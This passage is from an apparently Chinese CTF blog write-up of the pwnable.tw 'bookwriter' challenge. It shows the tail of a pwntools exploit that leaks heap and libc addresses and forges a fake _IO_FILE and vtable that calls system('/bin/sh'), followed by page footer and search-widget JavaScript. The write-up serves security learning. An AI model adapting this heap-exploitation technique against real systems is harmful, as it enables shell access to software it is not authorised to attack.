class="line">edit_page(0,&quot;\x00&quot;*0x18+&quot;\xe1\x0f\x00&quot;)</span><br><span class="line">heap_addr &#x3D; information(0,0)</span><br><span class="line">log.warn(&quot;heap addr: 0x%x &quot; % heap_addr)</span><br><span class="line"></span><br><span class="line">for i in range(0,8):</span><br><span class="line">    add_page(0x64,&quot;a&quot;*8)</span><br><span class="line"></span><br><span class="line">top_addr &#x3D; view_page(3)</span><br><span class="line">log.warn(&quot;top_addr: 0x%x&quot; % top_addr)</span><br><span class="line">#yuancheng</span><br><span class="line">libc_base &#x3D; top_addr - 0x58 - 0x3c3b20</span><br><span class="line">#bendi</span><br><span class="line">#libc_base &#x3D; top_addr - 0x58 - 0x3c4b20</span><br><span class="line">log.warn(&quot;libc_base: 0x%x&quot; % libc_base)</span><br><span class="line"></span><br><span class="line">fakefile &#x3D; &quot;&#x2F;bin&#x2F;sh\0&quot; + p64(0x61) + p64(0) + p64(libc_base + mylibc.symbols[&#39;_IO_list_all&#39;]-0x10) + p64(2) + p64(3)</span><br><span class="line">fakefile +&#x3D; &quot;\x00&quot;*0x90 + p64(0xffffffffffffffff) + &quot;\x00&quot;*0x10 </span><br><span class="line">fakefile +&#x3D; p64(heap_addr + 0x390 + 0xe0)</span><br><span class="line"></span><br><span class="line">vtable &#x3D; p64(0) + p64(0) + p64(1) + p64(libc_base + mylibc.symbols[&quot;system&quot;])</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;\x00&quot;*0x390 + fakefile + vtable</span><br><span class="line">edit_page(0,payload)</span><br><span class="line"></span><br><span class="line">myproc.recvuntil(&quot;Your choice :&quot;)</span><br><span class="line">myproc.sendline(str(1))</span><br><span class="line">myproc.recvuntil(&quot;Size of page :&quot;)</span><br><span class="line">myproc.sendline(str(0x10))</span><br><span class="line"></span><br><span class="line">#gdb.attach(myproc)</span><br><span class="line">myproc.interactive()</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2020/04/04/bookwriter/">http://blingblingxuanxuan.github.io/2020/04/04/bookwriter/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2020/04/19/babyfengshui/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">babyfengshui</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2020/03/29/seethefile/"><span class="paginator-prev__text">pwnable.tw之seethefile</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">
+          1 分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">
+          2 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E6%B3%84%E9%9C%B2%E5%A0%86%E5%9C%B0%E5%9D%80%E5%92%8Clibc%E5%9F%BA%E5%9D%80"><span class="toc-number">2.1.</span> <span class="toc-text">
+          2.1 泄露堆地址和libc基址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-get-shell"><span class="toc-number">2.2.</span> <span class="toc-text">
+          2.2 get shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-attack"><span class="toc-number">2.2.1.</span> <span class="toc-text">
+          unsorted bin attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#I-O-FILE"><span class="toc-number">2.2.2.</span> <span class="toc-text">
+          I&#x2F;O FILE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-EXP"><span class="toc-number">3.</span> <span class="toc-text">
+          3 EXP</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://weibo.com/anxinbuzitreexy" target="_blank" rel="noopener" data-popover="微博" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weibo"></i></span></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
